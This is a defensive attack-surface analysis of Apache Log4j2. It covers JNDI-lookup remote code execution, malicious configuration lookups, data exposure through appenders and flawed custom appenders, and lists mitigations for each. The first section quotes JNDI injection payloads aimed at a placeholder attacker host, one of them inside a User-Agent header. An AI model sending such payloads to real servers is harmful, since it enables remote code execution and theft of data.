# Attack Surface Analysis for apache/logging-log4j2

## Attack Surface: [Remote Code Execution via Message Lookups (e.g., JNDI Injection)](./attack_surfaces/remote_code_execution_via_message_lookups__e_g___jndi_injection_.md)

* **Attack Surface: Remote Code Execution via Message Lookups (e.g., JNDI Injection)**
    * **Description:** Attackers can craft malicious log messages containing special syntax (e.g., `${jndi:ldap://attacker.com/evil}`) that, when processed by Log4j2, trigger lookups to external resources. This can lead to the execution of arbitrary code on the server.
    * **How logging-log4j2 contributes:** Log4j2's message lookup feature, particularly the support for JNDI lookups in vulnerable versions, allows for dynamic resolution of values from external sources based on patterns within log messages.
    * **Example:** An attacker sends a request to a web application with a User-Agent header like: `User-Agent: ${jndi:ldap://attacker.com/Exploit}`. If this header is logged by Log4j2, it can trigger the JNDI lookup.
    * **Impact:** Full compromise of the server, including data exfiltration, malware installation, and denial of service.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * **Upgrade Log4j2:** Update to the latest stable version of Log4j2 that mitigates the JNDI lookup vulnerability (version 2.17.1 or later for the most critical vulnerabilities).
        * **Disable Message Lookups:** Configure Log4j2 to disable message lookups entirely by setting the system property `log4j2.formatMsgNoLookups` to `true` or by setting the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS` to `true`.
        * **Remove JNDILookup Class:** For older versions where upgrading is not immediately feasible, remove the `JndiLookup.class` from the `log4j-core` JAR file.

## Attack Surface: [Remote Code Execution via Configuration Lookups](./attack_surfaces/remote_code_execution_via_configuration_lookups.md)

* **Attack Surface: Remote Code Execution via Configuration Lookups**
    * **Description:** Similar to message lookups, Log4j2 configuration files can also contain lookup expressions. If an attacker can influence the Log4j2 configuration (e.g., through file uploads or insecure configuration management), they might be able to inject malicious lookups leading to code execution.
    * **How logging-log4j2 contributes:** Log4j2's ability to resolve lookups within its configuration files makes it vulnerable if the configuration source is not trusted or properly secured.
    * **Example:** An attacker uploads a malicious Log4j2 configuration file containing a JNDI lookup within an appender definition. When the application reloads the configuration, the malicious lookup is triggered.
    * **Impact:** Full compromise of the server, similar to message lookup exploitation.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * **Secure Configuration Sources:** Ensure that Log4j2 configuration files are stored securely and are not accessible or modifiable by unauthorized users.
        * **Restrict Configuration Reloading:** Limit or control the ability to dynamically reload Log4j2 configurations, especially from external sources.
        * **Disable Lookups in Configuration:** If possible, configure Log4j2 to disallow lookups within configuration files.

## Attack Surface: [Information Disclosure via Appenders](./attack_surfaces/information_disclosure_via_appenders.md)

* **Attack Surface: Information Disclosure via Appenders**
    * **Description:** If Log4j2 is configured to use appenders that send logs to external systems (e.g., databases, network sockets, cloud services) and these destinations are compromised or insecurely configured, sensitive information logged by the application could be exposed.
    * **How logging-log4j2 contributes:** Log4j2's flexibility in directing log output to various destinations through appenders can become an attack vector if these destinations are not properly secured.
    * **Example:** Log4j2 is configured to write logs to a database with weak authentication. An attacker gains access to the database and can read sensitive information logged by the application.
    * **Impact:** Exposure of sensitive data, including user credentials, personal information, or business secrets.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * **Secure Appender Destinations:** Ensure that all external systems used as log destinations are properly secured with strong authentication, authorization, and encryption.
        * **Minimize Logged Data:** Avoid logging sensitive information unnecessarily. Implement data masking or redaction techniques before logging.
        * **Secure Network Communication:** Use secure protocols (e.g., TLS/SSL) for network appenders to encrypt log data in transit.

## Attack Surface: [Exploitation of Custom Appenders or Layouts](./attack_surfaces/exploitation_of_custom_appenders_or_layouts.md)

* **Attack Surface: Exploitation of Custom Appenders or Layouts**
    * **Description:** If the application uses custom-developed appenders or layouts for Log4j2, vulnerabilities within these custom components could be exploited by attackers.
    * **How logging-log4j2 contributes:** Log4j2's extensibility allows for custom appenders and layouts, but these custom components introduce their own potential attack surface if not developed securely.
    * **Example:** A custom appender designed to write logs to a specific file format has a vulnerability that allows for path traversal, enabling an attacker to write to arbitrary files on the system.
    * **Impact:** Varies depending on the vulnerability in the custom component, potentially leading to RCE, information disclosure, or DoS.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * **Secure Development Practices:** Follow secure coding practices when developing custom appenders and layouts, including thorough input validation and output encoding.
        * **Code Reviews:** Conduct regular security code reviews of custom Log4j2 components.

